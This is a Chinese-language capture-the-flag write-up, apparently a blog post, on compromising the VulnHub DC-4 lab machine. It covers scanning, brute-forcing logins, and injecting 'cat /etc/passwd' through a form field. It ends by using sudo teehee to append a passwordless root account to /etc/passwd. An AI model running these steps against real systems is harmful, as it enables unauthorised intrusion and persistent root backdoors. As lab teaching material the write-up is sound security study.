---
title: DC-4 LINUX sudo提权
date: 2021-08-19 00:02:54
updated: 2021-08-19 00:02:54
categories: 漏洞复现
password: npfs2333
---



LINUX sudo提权实战<!--more-->

# DC-4靶场介绍
在学习了上一篇章（LINUX sudo提权）的基础上，进行实战学习，并作如下记录

靶机DC-4下载地址：https://download.vulnhub.com/dc/DC-4.zip

渗透要求：靶机需要获得root权限，并找到flag

# 环境配置
将下载的ovawen文件导入vmware
![图片描述](https://static.cdnjs.cloud/20210809/image-1628500986107_955895151608.png)


因为不知道DC-4靶机的IP，为了方便做题，我们需要将靶机和kali放在同一个局域网里面，这里我选择桥接模式

![图片描述](https://static.cdnjs.cloud/20210808/image-1628388072613_816924564271.png)

注意下靶机和kali的网络适配器都要选桥接
![图片描述](https://static.cdnjs.cloud/20210808/image-1628388123481_640258364027.png)

这里建议连热点来做，不知道为什么连wifi的时候nmap扫不到IP地址

# 信息收集
## 扫描存货主机
```
arp-scan -l
```
![图片描述](https://static.cdnjs.cloud/20210809/image-1628501548036_135464446905.png)
靶机IP地址为192.168.43.249

## 端口扫描
```
nmap -sS 192.168.43.249
```
![图片描述](https://static.cdnjs.cloud/20210809/image-1628501578271_56478863566.png)
开放端口有22（ssh）、80（http）


## 页面
浏览器打开靶机网址，是一个登录页面
![图片描述](https://static.cdnjs.cloud/20210809/image-1628502024677_52389741389.png)


# 漏洞发现
在页面尝试登入，登录页面提示“admin information systems login”，应该是使用admin用户登录，但需要对admin用户密码爆破

使用本地127.0.0.1:8080代理，并打开BurpSuite开启监听

![图片描述](https://static.cdnjs.cloud/20210809/image-1628502321906_572258446226.png)

将包传到Intruder模块，爆破
![图片描述](https://static.cdnjs.cloud/20210809/image-1628502261843_736899294883.png)

得到密码为happy
>username:  admin
>password: happy

成功登入
![图片描述](https://static.cdnjs.cloud/20210809/image-1628502428594_901137917008.png)

点击command -> run，发现执行了`ls -l`命令
![图片描述](https://static.cdnjs.cloud/20210809/image-1628502682417_757601070452.png)

我们在这里抓给包,更改下执行的命令：
```
radio=cat+/etc/passwd&submit=Run
```
![图片描述](https://static.cdnjs.cloud/20210809/image-1628502839930_877071614134.png)
发现了三个普通用户


分别查看这三个用户目录，最终在jim用户目录发现一个备份文件，里面是一堆的密码
![图片描述](https://static.cdnjs.cloud/20210809/image-1628503129303_104827878700.png)

使用xhydra对三个普通用户ssh登录爆破，三个用户名写入user.txt文件，密码写入pass.txt文件，爆破成功发现jim用户登入密码
![图片描述](https://static.cdnjs.cloud/20210809/image-1628503748321_819650226191.png)
>username: jim
>password: jibril04

使用jim用户成功连接到ssh
![图片描述](https://static.cdnjs.cloud/20210809/image-1628503828659_897467320464.png)

进入jim家目录，查看mbox文件，是发给jim的一封邮件的简单描述
```
cat mbox
```
![图片描述](https://static.cdnjs.cloud/20210809/image-1628503938697_926493630562.png)


我们去邮件默认地址`/var/mail`目录下看下这个邮件内容
![图片描述](https://static.cdnjs.cloud/20210809/image-1628503982297_916506168911.png)

发现charles用户的登录密码

>username: charles     
>password: ^xHhA&hvim0y

切换到charles用户
```
su charles
^xHhA&hvim0y  #密码
```
![图片描述](https://static.cdnjs.cloud/20210809/image-1628504075069_614742829130.png)

使用sudo命令查看charles用户可以哪些具有root权限的命令，发现可以使用teehee命令
```
sudo  -l
```
![图片描述](https://static.cdnjs.cloud/20210809/image-1628504117256_851615082369.png)

我们看下这个命令有什么用
![图片描述](https://static.cdnjs.cloud/20210809/image-1628504344931_723282995046.png)
>teehee命令可以写入文件内容并不覆盖文件原有内容

# 漏洞利用
使用teehee命令将一个无密码用户admin写入到/etc/passwd文件，并加入到root组中
```
echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

![图片描述](https://static.cdnjs.cloud/20210809/image-1628504401123_325314699094.png)

切换到admin用户登入，成功提权
![图片描述](https://static.cdnjs.cloud/20210809/image-1628504457336_294302367150.png)